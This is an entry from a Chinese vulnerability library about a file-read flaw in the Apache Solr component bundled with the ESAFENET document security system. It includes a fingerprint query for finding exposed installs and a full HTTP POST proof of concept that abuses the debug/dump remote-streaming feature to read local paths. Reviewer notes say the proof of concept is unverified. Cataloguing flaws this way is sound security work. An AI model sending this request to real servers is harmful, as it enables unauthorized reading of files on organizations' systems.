---
source: "wy876 漏洞文库"
title: "亿赛通内置Apache Solr debug/dump remote streaming文件读取"
product: "亿赛通内置Apache Solr"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "core flow、debug handler、remote streaming配置及Windows环境"
prerequisites: "有JSESSIONID；Solr权限未述"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/pt6h9gddl8ipaiz8"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%BA%BF%E8%B5%9B%E9%80%9A/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fdump%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"ESAFENET 亿赛通文档安全管理系统\""
id: "vw-ffafd040c08f30a45e391106"
entity_id: "ve-ffafd040c08f30a45e391106"
schema_version: "1"
---

# 亿赛通内置Apache Solr debug/dump remote streaming文件读取

## 条目说明

- 对象与具体问题：亿赛通内置Apache Solr；debug/dump remote streaming文件读取
- 版本、配置及部署条件：core flow、debug handler、remote streaming配置及Windows环境
- 认证与权限前提：有JSESSIONID；Solr权限未述
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- stream.url指向C:\Program Files\目录而非文件，可能返回目录列表；不能当任意敏感文件读取证据
- URL包含空格/反斜杠需编码语义明确；无响应或remote streaming配置证据
- 应关联Solr组件配置风险而非泛亿赛通所有版本，区别dataimport RCE
- 缺修复和产品到组件版本映射

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
亿赛通电子文档安全管理系统是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，系统具有透明加密、主动加密、智能加密等多种加密方式，用户可根据部门涉密程度的不同（如核心部门和普通门），部署力度轻重不一的梯度式文档加密防护，实现技术、管理、审计进行有机的结合，在内部构建起立体化的整体信息防泄露体系，使得成本、效率和安全三者达到平衡，实现电子文档的数据安全。亿赛通电子文档安全管理系统dump存在任意文件读取漏洞。

## 二、影响版本
+ 亿赛通电子文档安全管理系统

## 三、资产测绘
+ hunter`app.name="ESAFENET 亿赛通文档安全管理系统"`
+ 登录页面


## 四、漏洞复现
```http
POST /solr/flow/debug/dump?param=ContentStreams HTTP/1.1
Host: 192.168.31.24:8090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: image/avif,image/webp,*/*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=31E80EEC9EE4DC0835A362E81A9D179F
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

stream.url=file:///C:\Program Files\
```

> 请求长度说明：原资料 Content-Length 为 36；保留原始标头；其数值未据实际请求体重新计算或验证。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pt6h9gddl8ipaiz8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
